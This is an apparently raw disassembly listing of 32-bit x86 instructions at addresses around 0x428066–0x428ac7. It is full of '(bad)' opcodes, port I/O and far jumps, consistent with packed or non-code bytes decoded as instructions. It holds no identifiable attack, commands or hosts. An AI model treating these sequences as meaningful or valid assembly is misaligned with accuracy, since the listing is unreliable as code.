  428066:	lods   al,BYTE PTR ds:[esi]
  428067:	add    BYTE PTR [ecx],bh
  428069:	cdq    
  42806a:	pop    edx
  42806b:	push   ebx
  42806c:	or     eax,0xb9552ba9
  428071:	jecxz  0x428033
  428073:	sbb    BYTE PTR [esi-0xd],dl
  428076:	pop    edi
  428077:	pop    ds
  428078:	jp     0x4280ec
  42807a:	sti    
  42807b:	add    eax,0xd3d0631c
  428080:	jnp    0x42800d
  428082:	imul   BYTE PTR [edx-0x59]
  428085:	ins    DWORD PTR es:[edi],dx
  428086:	pop    esi
  428087:	mov    ebp,0x9e696afe
  42808c:	test   DWORD PTR [edi-0x29],eax
  42808f:	aas    
  428090:	jns    0x428087
  428092:	mov    BYTE PTR [ebx-0x49],bh
  428095:	pop    esp
  428096:	fld    st(2)
  428098:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428099:	pop    es
  42809a:	cmp    BYTE PTR [ebp+0x10],cl
  42809d:	ss adc eax,0x5d18e3d7
  4280a3:	add    DWORD PTR [esi],0xffffff8e
  4280a6:	mov    esi,0x5d8f664f
  4280ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4280ac:	xchg   ebp,eax
  4280ad:	js     0x42811b
  4280af:	fidiv  WORD PTR ds:[edi]
  4280b2:	sbb    eax,0x7b249d02
  4280b7:	dec    esp
  4280b8:	cld    
  4280b9:	int3   
  4280ba:	mov    ds:0xec4b7d6b,eax
  4280bf:	out    0xa1,al
  4280c1:	pop    ebp
  4280c2:	cmp    edi,DWORD PTR [ebp-0x4d]
  4280c5:	mov    edi,0x793bcdc3
  4280ca:	add    BYTE PTR [eax],bh
  4280cc:	sub    DWORD PTR [esi+0x21],esp
  4280cf:	inc    edi
  4280d0:	(bad)  
  4280d1:	fistp  QWORD PTR [eax+0x4d3d65df]
  4280d7:	pop    ds
  4280d8:	pop    esi
  4280d9:	push   edi
  4280da:	test   BYTE PTR [ebx],ch
  4280dc:	icebp  
  4280dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4280de:	in     al,dx
  4280df:	mov    esi,0x13c1ea8e
  4280e4:	clc    
  4280e5:	mov    fs,WORD PTR [ebx+esi*4]
  4280e8:	dec    esi
  4280e9:	dec    ebp
  4280ea:	sbb    cl,BYTE PTR [ecx+0x57]
  4280ed:	mov    edx,0xbb3c2bed
  4280f2:	pop    es
  4280f3:	push   cs
  4280f4:	ss aam 0x9b
  4280f7:	out    0xa,al
  4280f9:	add    dh,BYTE PTR [ecx-0x42]
  4280fc:	gs out dx,eax
  4280fe:	fld1   
  428100:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  428102:	cmp    al,0x79
  428104:	out    dx,eax
  428105:	mov    al,dh
  428107:	(bad)  
  428108:	xchg   bl,bl
  42810a:	imul   eax,esi,0xffffff83
  42810d:	jmp    0x0:0xdcdf
	...
  428174:	fucomip st,st(6)
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	jnp    0x4281d6
  428182:	stc    
  428183:	fistp  QWORD PTR [eax]
  428185:	lods   al,BYTE PTR ds:[esi]
  428186:	add    DWORD PTR [eax],eax
  428188:	add    al,0x1
  42818a:	add    BYTE PTR [eax],al
  42818c:	ret    0x9053
  42818f:	inc    edi
  428190:	repz jge 0x428177
  428193:	outs   dx,DWORD PTR ds:[esi]
  428194:	mov    cl,0xc3
  428196:	mov    esp,0x236d4a6e
  42819b:	push   eax
  42819c:	dec    esi
  42819d:	test   BYTE PTR [esi+0x48],dl
  4281a0:	jp     0x42816a
  4281a2:	stc    
  4281a3:	or     al,0x99
  4281a5:	sub    DWORD PTR [esi-0x28c6a085],edi
  4281ab:	and    al,0xc3
  4281ad:	jbe    0x42819d
  4281af:	sub    edx,0x8000cca1
  4281b5:	push   0x2c
  4281b7:	pmullw mm1,QWORD PTR [edx]
  4281ba:	pop    ebx
  4281bb:	into   
  4281bc:	mov    edx,0x3cf384dd
  4281c1:	aad    0xbb
  4281c3:	xchg   edx,eax
  4281c4:	sbb    bl,dh
  4281c6:	xchg   ebp,eax
  4281c7:	mov    WORD PTR [eax+0x7862e0f1],?
  4281cd:	and    edx,edx
  4281cf:	test   dl,0x5a
  4281d2:	and    al,0xbd
  4281d4:	cmp    eax,0x45b0c976
  4281d9:	stc    
  4281da:	fsub   DWORD PTR [ebp-0x561b025e]
  4281e0:	sbb    eax,0xb43898ff
  4281e5:	dec    ebx
  4281e6:	pop    esp
  4281e7:	add    eax,0xd465591f
  4281ec:	sbb    cl,BYTE PTR [eax-0x79c7eec4]
  4281f2:	mov    cs,ebx
  4281f4:	push   ecx
  4281f5:	lods   al,BYTE PTR ds:[esi]
  4281f6:	je     0x4281d6
  4281f8:	ja     0x428257
  4281fa:	daa    
  4281fb:	js     0x428229
  4281fd:	ins    BYTE PTR es:[edi],dx
  4281fe:	aaa    
  4281ff:	xor    bl,BYTE PTR [edi+edi*8+0x4e]
  428203:	outs   dx,DWORD PTR ds:[esi]
  428204:	cmp    al,0xb8
  428206:	stos   DWORD PTR es:[edi],eax
  428207:	pop    esp
  428208:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428209:	xor    DWORD PTR [edi+0x4b],edx
  42820c:	xor    al,0x1d
  42820e:	pop    eax
  42820f:	and    BYTE PTR [edi+0x4e],bh
  428212:	jno    0x4281fb
  428214:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428215:	jo     0x428203
  428217:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428218:	and    DWORD PTR ds:[edi],esi
  42821b:	test   al,0x58
  42821d:	cmp    BYTE PTR [ecx],0x93
  428220:	loope  0x428212
  428222:	and    dl,bl
  428224:	mov    WORD PTR [edx-0x1e5be1b4],gs
  42822a:	(bad)  
  42822b:	iret   
  42822c:	adc    eax,0x6ca352c3
  428231:	or     al,bh
  428233:	std    
  428234:	loope  0x42829b
  428236:	pop    edi
  428237:	fstp   DWORD PTR [eax+0x3d7a3959]
  42823d:	sub    BYTE PTR [edi],0x12
  428240:	xchg   edi,edi
  428242:	add    al,BYTE PTR [ebx-0x3c]
  428245:	sub    BYTE PTR [ebx+0x2],ch
  428248:	enter  0x7736,0x54
  42824c:	jb     0x42821b
  42824e:	cmp    eax,0x13b80bab
  428253:	mov    ah,0xc9
  428255:	xor    DWORD PTR [edx+edx*4],0x6e
  428259:	dec    esi
  42825a:	lock jmp 0x4282cc
  42825d:	in     al,dx
  42825e:	bound  edx,QWORD PTR ds:0x6952785a
  428264:	in     eax,dx
  428265:	push   eax
  428266:	mov    ah,0x9c
  428268:	push   es
  428269:	das    
  42826a:	je     0x428210
  42826c:	test   BYTE PTR [edi],dh
  42826e:	fwait
  42826f:	sbb    ebx,ecx
  428271:	out    dx,al
  428272:	add    al,0x7b
  428274:	adc    DWORD PTR [eax+0x7516dac3],esi
  42827a:	mov    edi,0x90551c21
  42827f:	push   esi
  428280:	scas   eax,DWORD PTR es:[edi]
  428281:	xchg   BYTE PTR [ecx],ch
  428283:	mov    eax,0x7a5ef02f
  428288:	xchg   edx,eax
  428289:	sub    al,0xd8
  42828b:	add    DWORD PTR [edi+0x2c],ebp
  42828e:	sub    al,0x85
	...
  4282f4:	(bad)  
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	int3   
  428301:	(bad)  
  428302:	adc    ah,BYTE PTR [ebp+0x1ad3c]
  428308:	add    al,0x1
  42830a:	add    BYTE PTR [eax],al
  42830c:	or     BYTE PTR [ecx+0x6e],0xce
  428310:	adc    cl,BYTE PTR [eax+0x20]
  428313:	pushf  
  428314:	loop   0x428331
  428316:	adc    BYTE PTR [eax-0x7c],al
  428319:	loop   0x4282d4
  42831b:	mov    WORD PTR [eax+0x578da6a3],ds
  428321:	xchg   esi,eax
  428322:	pop    ebx
  428323:	outs   dx,DWORD PTR ds:[esi]
  428324:	repnz mov dh,0x37
  428327:	pop    ecx
  428328:	dec    ecx
  428329:	xor    esi,ecx
  42832b:	jbe    0x4282f7
  42832d:	out    0x96,al
  42832f:	push   edx
  428330:	loop   0x428399
  428332:	imul   ecx,DWORD PTR [edx+0x27],0x22
  428336:	pop    ds
  428337:	sti    
  428338:	sbb    BYTE PTR [eax+ecx*1-0x1c704f2e],dh
  42833f:	sub    ah,BYTE PTR [eax+0x77]
  428342:	add    edi,DWORD PTR [edi]
  428344:	push   ecx
  428345:	(bad)  
  428346:	popf   
  428347:	jl     0x4282d2
  428349:	lock js 0x4283a0
  42834c:	jle    0x428302
  42834e:	in     eax,dx
  42834f:	cwde   
  428350:	test   BYTE PTR [esi],0x19
  428353:	lea    edi,[edx+0xd]
  428356:	les    ebp,FWORD PTR [esi-0x62]
  428359:	sbb    al,0x4a
  42835b:	mov    es,WORD PTR [ebx+0x45]
  42835e:	xchg   ebx,eax
  42835f:	xor    al,BYTE PTR [esi-0x7fab232b]
  428365:	in     al,dx
  428366:	jge    0x428350
  428368:	loopne 0x4283a1
  42836a:	adc    dl,cl
  42836c:	loop   0x42837b
  42836e:	cmp    DWORD PTR [ecx-0x2347f8c5],esi
  428374:	shr    BYTE PTR [ebx],cl
  428376:	push   0x7d
  428378:	ror    BYTE PTR [esi],cl
  42837a:	test   DWORD PTR [edi],edx
  42837c:	xchg   edx,eax
  42837d:	inc    ecx
  42837e:	(bad)  
  42837f:	push   ss
  428380:	jecxz  0x4283e1
  428382:	lods   al,BYTE PTR ds:[esi]
  428383:	inc    edi
  428384:	mov    eax,ds:0x4f7a1369
  428389:	or     al,0xda
  42838b:	sbb    bl,0x4d
  42838e:	ds mov dh,0x21
  428391:	rcl    ah,cl
  428393:	jle    0x4283fa
  428395:	pop    edx
  428396:	xchg   edi,eax
  428397:	and    BYTE PTR [eax-0x45492239],0x86
  42839e:	loopne 0x4283ff
  4283a0:	in     eax,0xe7
  4283a2:	push   eax
  4283a3:	sti    
  4283a4:	mov    esi,0x5bb5dfb0
  4283a9:	xchg   ebx,eax
  4283aa:	inc    eax
  4283ab:	inc    edi
  4283ac:	mov    ds:0x76b823c0,al
  4283b1:	or     BYTE PTR [edx-0x6f],bh
  4283b4:	ror    BYTE PTR [esi+0x5fb27bde],cl
  4283ba:	push   ecx
  4283bb:	fsubr  st,st(7)
  4283bd:	rol    edx,0x18
  4283c0:	leave  
  4283c1:	dec    esi
  4283c2:	cmp    eax,0xad455475
  4283c7:	mov    DWORD PTR [esi+0x207f6cf2],ecx
  4283cd:	sub    DWORD PTR [ebp+0x67],0xffffff9e
  4283d1:	das    
  4283d2:	sub    al,0x4
  4283d4:	pop    eax
  4283d5:	aaa    
  4283d6:	das    
  4283d7:	shr    DWORD PTR [ecx],cl
  4283d9:	loope  0x428382
  4283db:	(bad)  
  4283dd:	mov    esp,DWORD PTR [ebp-0x3d9bf4bd]
  4283e3:	shl    DWORD PTR [edi+0xdb09479],1
  4283e9:	push   es
  4283ea:	xlat   BYTE PTR ds:[ebx]
  4283eb:	fwait
  4283ec:	pusha  
  4283ed:	scas   al,BYTE PTR es:[edi]
  4283ee:	inc    eax
  4283ef:	fdivr  QWORD PTR [ebx-0x6804025e]
  4283f5:	aad    0x75
  4283f7:	into   
  4283f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283f9:	xchg   ebx,eax
  4283fa:	push   eax
  4283fb:	push   esp
  4283fc:	mov    ebp,0xc1dbb15b
  428401:	mov    al,ds:0x4278b781
  428406:	inc    DWORD PTR [edx+0x36932843]
  42840c:	leave  
  42840d:	and    cl,BYTE PTR [ebx+0x56]
	...
  428473:	add    BYTE PTR [esi],cl
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0x2aabfb32
  428481:	test   bl,ah
  428483:	outs   dx,BYTE PTR ds:[esi]
  428484:	inc    eax
  428485:	scas   al,BYTE PTR es:[edi]
  428486:	add    DWORD PTR [eax],eax
  428488:	add    al,0x1
  42848a:	add    BYTE PTR [eax],al
  42848c:	pop    esp
  42848d:	mov    eax,ds:0xa7ed3f15
  428492:	daa    
  428493:	mov    dh,dh
  428495:	ja     0x428515
  428497:	loopne 0x4284e5
  428499:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42849a:	xchg   BYTE PTR [ecx],al
  42849c:	es mov bh,0x13
  42849f:	iret   
  4284a0:	emms   
  4284a2:	sbb    al,0x37
  4284a4:	inc    ebx
  4284a5:	pop    ss
  4284a6:	push   ebx
  4284a7:	pusha  
  4284a8:	mov    eax,DWORD PTR [esi+0x15fcdc68]
  4284ae:	pop    ecx
  4284af:	and    esp,DWORD PTR [ebx]
  4284b1:	fs dec eax
  4284b3:	popf   
  4284b4:	pop    ecx
  4284b5:	inc    esp
  4284b6:	lods   al,BYTE PTR ds:[esi]
  4284b7:	sub    bh,bh
  4284b9:	xchg   edi,eax
  4284ba:	or     bl,BYTE PTR [ecx-0x6be59259]
  4284c0:	(bad)  
  4284c1:	cmc    
  4284c2:	pop    ss
  4284c3:	mov    ds:0xed4c6421,al
  4284c8:	(bad)  
  4284c9:	jge    0x42847c
  4284cb:	sbb    bl,BYTE PTR [esi-0x6a1d92c4]
  4284d1:	adc    cl,BYTE PTR ds:0xd805c5a5
  4284d7:	xchg   ebp,eax
  4284d8:	cmp    al,0x1e
  4284da:	out    0x48,al
  4284dc:	add    sp,ax
  4284df:	mov    ds:0x75ac8152,eax
  4284e4:	test   BYTE PTR [ecx-0x103d0800],0xf9
  4284eb:	and    eax,0xe2159c18
  4284f0:	shl    BYTE PTR [eax+eax*1+0x228453fe],0x37
  4284f8:	mov    DWORD PTR [ebp-0x51eefd84],esp
  4284fe:	sbb    esi,eax
  428500:	dec    esp
  428501:	mov    esi,0xc9ac9e78
  428506:	xchg   edi,eax
  428507:	ins    BYTE PTR es:[edi],dx
  428508:	cwde   
  428509:	test   al,0x7b
  42850b:	in     eax,0xf3
  42850d:	lods   al,BYTE PTR ds:[esi]
  42850e:	sub    DWORD PTR [ecx-0x79c84d4],ecx
  428514:	mov    dl,0x44
  428516:	es mov al,0x1b
  428519:	jg     0x4284c6
  42851b:	(bad)  [esp+edi*4]
  42851e:	dec    ebx
  42851f:	out    0x94,eax
  428521:	in     al,dx
  428522:	aaa    
  428523:	test   BYTE PTR [edi+0x7f4b3816],dh
  428529:	fmul   st(1),st
  42852b:	sub    DWORD PTR [ebp+0x53],eax
  42852e:	dec    edi
  42852f:	mov    DWORD PTR [ebx-0x74],ebx
  428532:	add    ecx,DWORD PTR [edx]
  428534:	ds adc eax,0xda3a4d1f
  42853a:	push   0x2a42ef34
  42853f:	out    dx,al
  428540:	push   esi
  428541:	shl    DWORD PTR [esi-0x42],1
  428544:	in     al,0xb6
  428546:	cwde   
  428547:	shr    DWORD PTR [esp+eiz*2-0x6062a9bc],0x5b
  42854f:	stc    
  428550:	daa    
  428551:	push   ss
  428552:	pop    esp
  428553:	loop   0x4285c6
  428555:	mov    eax,0x439e0d02
  42855a:	aad    0xae
  42855c:	clc    
  42855d:	xchg   BYTE PTR [ecx+0xd],bl
  428560:	adc    ebx,DWORD PTR [esp+ebx*2+0x511ba465]
  428567:	lods   eax,DWORD PTR ds:[esi]
  428568:	push   eax
  428569:	add    bl,bl
  42856b:	add    ebx,ebx
  42856d:	enter  0x55de,0xaf
  428571:	cmp    DWORD PTR [ecx],esi
  428573:	(bad)  
  428574:	jge    0x42857a
  428576:	enter  0xd505,0xec
  42857a:	sub    edx,DWORD PTR [ecx+esi*2]
  42857d:	lock mov eax,ds:0x1e119b30
  428583:	addr16 test al,0x59
  428586:	retf   
  428587:	sbb    al,0xfb
  428589:	push   esi
  42858a:	into   
  42858b:	dec    ebx
  42858c:	lds    ecx,FWORD PTR [edi+0xb35a]
	...
  4285f2:	add    BYTE PTR [eax],al
  4285f4:	push   ecx
  4285f5:	div    BYTE PTR ds:0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0x340ca3f6
  428602:	mov    ds:0x1af4453,eax
  428607:	add    BYTE PTR [ecx+eax*1],al
  42860a:	add    BYTE PTR [eax],al
  42860c:	mov    WORD PTR [ecx+0x45],cs
  42860f:	mov    ah,0xc8
  428611:	test   eax,0x7b604fb4
  428616:	jmp    ebp
  428618:	cdq    
  428619:	xor    eax,0x5d8fb8a9
  42861e:	test   eax,0xb2582022
  428623:	push   ecx
  428624:	ficomp DWORD PTR [ebx]
  428626:	out    dx,eax
  428627:	lock mov ah,0x61
  42862a:	adc    WORD PTR [edi+0x4b],di
  42862e:	aas    
  42862f:	loopne 0x428696
  428631:	or     edx,DWORD PTR [ebp-0x7d46d85f]
  428637:	sbb    cl,BYTE PTR [edx+0x2f138fba]
  42863d:	fnstenv [esi]
  42863f:	(bad)
  428643:	test   eax,0xfa031924
  428648:	jns    0x4285e8
  42864a:	mov    dl,0xf8
  42864c:	xor    bl,BYTE PTR [ebx-0x3519ce33]
  428652:	fwait
  428653:	cmp    al,0xbd
  428655:	das    
  428656:	dec    edx
  428657:	ins    DWORD PTR es:[edi],dx
  428658:	retf   0xde1a
  42865b:	push   esp
  42865c:	in     eax,0x2e
  42865e:	inc    ebx
  42865f:	cs xor al,0x4d
  428662:	mov    ds:0xaf0b2a81,eax
  428667:	mov    ebp,0x690dbf7e
  42866c:	ret    0xcb6e
  42866f:	xlat   BYTE PTR ds:[ebx]
  428670:	xchg   esp,eax
  428671:	adc    edi,DWORD PTR [ebp-0x28]
  428674:	or     al,0x46
  428676:	lods   al,BYTE PTR ds:[esi]
  428677:	jnp    0x42867e
  428679:	jns    0x428665
  42867b:	shl    DWORD PTR [ecx],1
  42867d:	mov    bh,0xe3
  42867f:	outs   dx,BYTE PTR fs:[esi]
  428681:	mov    ecx,0x4062fe21
  428686:	adc    ebp,DWORD PTR [ebp-0x5c]
  428689:	mov    ss:0x34d51970,eax
  42868f:	ja     0x428655
  428691:	jo     0x4286f3
  428693:	and    ecx,ecx
  428695:	inc    esp
  428696:	sub    BYTE PTR [eax],0x5a
  428699:	bound  esp,QWORD PTR [esi+0x541fad67]
  42869f:	retf   0xa491
  4286a2:	cmp    eax,0x1526fe7
  4286a7:	mov    edi,0xdfbf63a
  4286ac:	int3   
  4286ad:	mov    edx,0x9bebf8b4
  4286b2:	mov    ds:0x68972c04,al
  4286b7:	loope  0x4286db
  4286b9:	jb     0x4286dd
  4286bb:	sbb    ah,BYTE PTR [ebx]
  4286bd:	mov    eax,ds:0xc78b27d1
  4286c2:	pop    esp
  4286c3:	jae    0x4286af
  4286c5:	cmp    DWORD PTR [edx-0x2a95287c],0x1
  4286cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4286cd:	push   ss
  4286ce:	add    dh,BYTE PTR [esi+0x6d6a4fa]
  4286d4:	rcr    BYTE PTR [esi-0x72a05574],0xf6
  4286db:	stos   DWORD PTR es:[edi],eax
  4286dc:	lods   al,BYTE PTR ds:[esi]
  4286dd:	pop    ecx
  4286de:	mov    dh,0xe2
  4286e0:	lock cmp DWORD PTR [eax-0x28],esi
  4286e4:	adc    al,0x80
  4286e6:	cld    
  4286e7:	push   esp
  4286e8:	mov    dh,0xe6
  4286ea:	cli    
  4286eb:	pop    edi
  4286ec:	ins    DWORD PTR es:[edi],dx
  4286ed:	mov    eax,ds:0xfe8edcb5
  4286f2:	and    al,0xc6
  4286f4:	aas    
  4286f5:	frstor [eax]
  4286f7:	push   ss
  4286f8:	fist   DWORD PTR [esp+ebp*2-0x8b90f40]
  4286ff:	inc    edx
  428700:	test   DWORD PTR ds:0xc499055f,0x2e81e45a
  42870a:	and    eax,0xd3b82099
  42870f:	dec    edi
	...
  428774:	push   esi
  428775:	pop    ebx
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0x7b0a2096
  428783:	dec    edi
  428784:	dec    eax
  428785:	mov    al,0x1
  428787:	add    BYTE PTR [ecx+eax*1],al
  42878a:	add    BYTE PTR [eax],al
  42878c:	cwde   
  42878d:	aam    0x7e
  42878f:	sub    BYTE PTR [eax-0x6ce9509c],dl
  428795:	cmp    DWORD PTR [ebp+ebx*2+0x1d02a246],edx
  42879c:	test   al,0xa5
  42879e:	mov    edx,0xf36e2259
  4287a3:	dec    esp
  4287a4:	stc    
  4287a5:	scas   eax,DWORD PTR es:[edi]
  4287a6:	xchg   edx,eax
  4287a7:	inc    ecx
  4287a8:	or     eax,0x2632ed9
  4287ad:	xchg   ebx,eax
  4287ae:	xor    DWORD PTR [ebx],esp
  4287b0:	push   0x3643b4a0
  4287b5:	xlat   BYTE PTR ds:[ebx]
  4287b6:	cmc    
  4287b7:	mov    DWORD PTR [eax],0x26112446
  4287bd:	xchg   ebp,eax
  4287be:	sar    BYTE PTR [esp+eiz*4],1
  4287c1:	fsubr  DWORD PTR [ecx+0x2d]
  4287c4:	in     al,0x9
  4287c6:	inc    edx
  4287c7:	mov    bl,0x94
  4287c9:	out    0x7a,al
  4287cb:	xchg   edi,eax
  4287cc:	out    0x7a,al
  4287ce:	or     dh,BYTE PTR [ecx-0x4bb185ba]
  4287d4:	cld    
  4287d5:	retf   
  4287d6:	std    
  4287d7:	dec    eax
  4287d8:	push   cs
  4287d9:	sbb    BYTE PTR [ebp+0x24],dh
  4287dc:	dec    edx
  4287dd:	lods   al,BYTE PTR ds:[esi]
  4287de:	xor    ebp,DWORD PTR [edi+ecx*8+0x3b9f38d1]
  4287e5:	(bad)  
  4287e7:	js     0x428801
  4287e9:	mov    edx,0x6dde0fea
  4287ee:	jnp    0x428772
  4287f0:	ins    BYTE PTR es:[edi],dx
  4287f1:	mov    edi,0x5a0f4909
  4287f6:	test   bh,0x91
  4287f9:	push   edi
  4287fa:	cdq    
  4287fb:	aam    0x80
  4287fd:	test   eax,0xaeea2f13
  428802:	cmp    DWORD PTR [ebx-0x5e],eax
  428805:	add    DWORD PTR [ecx+edi*2+0x7e],0xffffffed
  42880a:	sub    BYTE PTR [edi-0x1684f26c],0x35
  428811:	inc    esi
  428812:	bound  ecx,QWORD PTR [edx+0x34]
  428815:	lods   al,BYTE PTR ds:[esi]
  428816:	mov    dh,0x10
  428818:	mov    ds:0x4cf827ff,al
  42881d:	(bad)  
  42881e:	js     0x42885b
  428820:	or     BYTE PTR [ecx],ch
  428822:	fwait
  428823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428824:	inc    edx
  428825:	mov    WORD PTR [ecx+eax*4-0x7d],?
  428829:	enter  0x44af,0xd6
  42882d:	ret    
  42882e:	inc    esi
  42882f:	imul   ebx,DWORD PTR [ebx-0x7b],0xffffffe6
  428833:	out    dx,eax
  428834:	leave  
  428835:	bound  esi,QWORD PTR fs:[ebx+0x3a75a7d1]
  42883c:	cmp    BYTE PTR ds:[edi+0x970b3e8],cl
  428843:	(bad)  
  428844:	cdq    
  428845:	mov    ds:0x871cf2aa,eax
  42884a:	ror    BYTE PTR [ebx+0x29a63f88],1
  428850:	gs ins BYTE PTR es:[edi],dx
  428852:	fdiv   DWORD PTR [edx-0x40]
  428855:	les    ecx,FWORD PTR [eax+0x3e43342b]
  42885b:	aam    0x44
  42885d:	pop    ebx
  42885e:	add    al,0xc4
  428860:	int3   
  428861:	fs xor eax,0x281aafd7
  428867:	loopne 0x42881d
  428869:	dec    ecx
  42886a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42886b:	ins    DWORD PTR es:[edi],dx
  42886c:	jmp    0xc66b:0x610b81ad
  428873:	cs xchg esp,eax
  428875:	xchg   edi,eax
  428876:	mov    eax,0xb94ae551
  42887b:	jae    0x4288d7
  42887d:	mov    ebx,esi
  42887f:	cmp    DWORD PTR [ecx+0x59dc87ed],eax
  428885:	adc    BYTE PTR [edi+0x5b],dl
  428888:	ret    
  428889:	push   es
  42888a:	jnp    0x428880
  42888c:	packuswb mm4,QWORD PTR [esi+0xd2]
	...
  4288f3:	add    BYTE PTR [esi],ah
  4288f5:	jp     0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi-0x488c62f1],bx
  428902:	cs ret 0xb14c
  428906:	add    DWORD PTR [eax],eax
  428908:	add    al,0x1
  42890a:	add    BYTE PTR [eax],al
  42890c:	push   0x260ee03f
  428911:	outs   dx,DWORD PTR ds:[esi]
  428912:	mov    eax,0x3c6ed8dc
  428917:	stc    
  428918:	ss cdq 
  42891a:	xchg   edx,eax
  42891b:	mov    eax,ds:0x5cfd9e0d
  428920:	(bad)  
  428921:	loopne 0x428957
  428923:	pop    ebp
  428924:	or     edx,DWORD PTR [esi+0x59]
  428927:	dec    edx
  428928:	in     eax,dx
  428929:	adc    DWORD PTR [eax+0x7f],edi
  42892c:	pop    es
  42892d:	rcr    di,cl
  428930:	shl    BYTE PTR [edi+0x42],0x92
  428934:	jb     0x4288eb
  428936:	ror    BYTE PTR [eax+0x6c],cl
  428939:	call   0xe1bf43b4
  42893e:	jl     0x4289bb
  428940:	punpckldq mm2,mm7
  428943:	neg    DWORD PTR [ebx]
  428945:	and    BYTE PTR ds:0x4959f949,dl
  42894b:	ds sbb eax,0xbe8d4be3
  428951:	dec    edi
  428952:	mov    ebp,DWORD PTR [esi+eax*2-0x5d]
  428956:	mov    al,0xdf
  428958:	xor    ch,dl
  42895a:	adc    ebp,DWORD PTR [ebp-0x1f]
  42895d:	jl     0x4289d9
  42895f:	sbb    cl,ah
  428961:	add    DWORD PTR [ebx-0x24],edx
  428964:	in     al,dx
  428965:	and    DWORD PTR ds:0xfba640d6,edx
  42896b:	mov    ebx,0xbfc37b79
  428970:	retf   0xc30
  428973:	stos   DWORD PTR es:[edi],eax
  428974:	mov    eax,DWORD PTR [eax-0x31]
  428977:	and    al,0x1a
  428979:	stc    
  42897a:	cmp    bh,al
  42897c:	test   al,0x6
  42897e:	mov    ch,0xfc
  428980:	sub    DWORD PTR [esi+edx*4+0x6d],0x1b
  428985:	out    0x1c,al
  428987:	xchg   edx,eax
  428988:	xor    BYTE PTR ds:0xa786b2f8,ch
  42898e:	mov    BYTE PTR [edi+0x15],dh
  428991:	cmp    edx,edx
  428993:	xchg   edx,eax
  428994:	(bad)  
  428995:	jecxz  0x428938
  428997:	adc    ebx,DWORD PTR [esi]
  428999:	popf   
  42899a:	(bad)  
  42899b:	cmp    edx,DWORD PTR [edx]
  42899d:	aad    0xd0
  42899f:	fidiv  DWORD PTR [ecx]
  4289a1:	dec    esi
  4289a2:	sar    BYTE PTR [ecx+0x172ed569],1
  4289a8:	jle    0x42895d
  4289aa:	add    eax,0x84ae6c3f
  4289af:	ins    BYTE PTR es:[edi],dx
  4289b0:	pushf  
  4289b1:	xor    ebp,edi
  4289b3:	push   eax
  4289b4:	mov    edx,0x4e4810a3
  4289b9:	pop    edx
  4289ba:	dec    ecx
  4289bb:	inc    esi
  4289bc:	pop    ds
  4289bd:	fild   QWORD PTR [esi+0x128be437]
  4289c3:	loop   0x4289e1
  4289c5:	mov    ds:0x784ef13d,eax
  4289ca:	stos   DWORD PTR es:[edi],eax
  4289cb:	or     eax,0x9d361598
  4289d0:	mov    ebp,0x45fe7bc
  4289d5:	mov    esp,0x8eccec1a
  4289da:	in     al,dx
  4289db:	dec    edx
  4289dc:	mov    edi,0xa06996e1
  4289e1:	jo     0x428a2f
  4289e3:	sub    al,0x87
  4289e5:	cmp    BYTE PTR [eax+0x5],0xcf
  4289e9:	imul   esi,DWORD PTR [edx+0x2f],0x5768bbaa
  4289f0:	mov    DWORD PTR [ecx],0xc74f1b34
  4289f6:	cwde   
  4289f7:	sar    BYTE PTR [ecx],1
  4289f9:	outs   dx,DWORD PTR ds:[esi]
  4289fa:	fdivp  st(2),st
  4289fc:	xchg   esi,eax
  4289fd:	push   ss
  4289fe:	push   0xffffffb1
  428a00:	stc    
  428a01:	mov    esi,0x7d47b164
  428a06:	dec    esi
  428a07:	mov    ebx,0x8a88b273
  428a0c:	mov    DWORD PTR [edi+0x57],eax
  428a0f:	mov    ds:0x0,al
	...
  428a74:	dec    ebp
  428a75:	or     al,0xf8
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax+0x746d13]
  428a83:	push   edx
  428a84:	push   eax
  428a85:	mov    dl,0x1
  428a87:	add    BYTE PTR [ecx+eax*1],al
  428a8a:	add    BYTE PTR [eax],al
  428a8c:	mov    esp,0x41929d11
  428a91:	cmp    eax,0xe146c8ed
  428a96:	fs aaa 
  428a98:	sub    dl,BYTE PTR [ecx+0x78]
  428a9b:	xchg   ebp,eax
  428a9c:	mov    eax,0xa08a671b
  428aa1:	(bad)  
  428aa2:	mov    dl,0x9e
  428aa4:	int3   
  428aa5:	cmc    
  428aa6:	test   edi,edi
  428aa8:	jecxz  0x428a7f
  428aaa:	cmp    eax,0x3f4d1ba6
  428aaf:	xchg   ecx,eax
  428ab0:	jg     0x428a58
  428ab2:	aas    
  428ab3:	in     eax,0xa2
  428ab5:	jno    0x428a8d
  428ab7:	stos   DWORD PTR es:[edi],eax
  428ab8:	es aaa 
  428aba:	pop    ds
  428abb:	in     eax,0x57
  428abd:	mov    al,0xa8
  428abf:	lods   eax,DWORD PTR ds:[esi]
  428ac0:	mov    eax,ds:0xbe3c5dba
  428ac5:	ja     0x428a52
  428ac7:	sbb    DWORD PTR [edx-0x5b4f2fad],edx
